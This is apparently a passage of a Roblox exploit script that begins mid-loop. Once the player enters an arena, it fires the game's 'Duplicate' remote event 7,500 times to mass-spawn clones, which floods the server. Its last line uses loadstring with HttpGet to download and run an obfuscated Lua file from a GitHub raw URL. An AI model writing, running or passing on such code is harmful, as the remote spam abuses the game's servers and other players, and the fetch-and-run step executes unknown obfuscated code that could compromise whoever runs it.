until game.Players.LocalPlayer.Character:FindFirstChild("entered") --entered arena
wait(0.5) --0.5 seconds
for i = 1, 7500 do --7500 clones spawn
        game:GetService("ReplicatedStorage").Duplicate:FireServer(unpack({[1] = true})) --spawn clone
end
wait(3.5) --3.5 seconds
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jelly-plays/Rejoin-script/main/obf_L744By559M18BbuseSG6en8r1zL31daK9060LV7WyvmS4bQp92aONWfwRE36FdcZ.lua.txt"))();
